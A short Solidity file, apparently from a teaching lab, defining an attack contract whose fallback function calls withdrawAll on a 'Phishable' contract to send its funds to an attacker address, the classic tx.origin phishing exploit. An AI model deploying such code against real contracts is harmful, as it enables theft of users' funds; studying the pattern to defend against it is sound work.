// SPDX-License-Identifier: MIT
// pragma solidity ^0.5.1;
pragma solidity ^0.6.0;

import "./Phishable.sol";

import "@nomiclabs/buidler/console.sol";

contract PhishableAttackContract {

    Phishable phishableContract;

    address payable attacker; // The attackers address to receive funds.

    constructor (Phishable _phishableContract, address payable _attackerAddress) public {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    fallback () external payable {
        phishableContract.withdrawAll(attacker);
        console.log("Info@PhishableAttack.sol::fallback method attacker@(%s)", attacker);
    }

}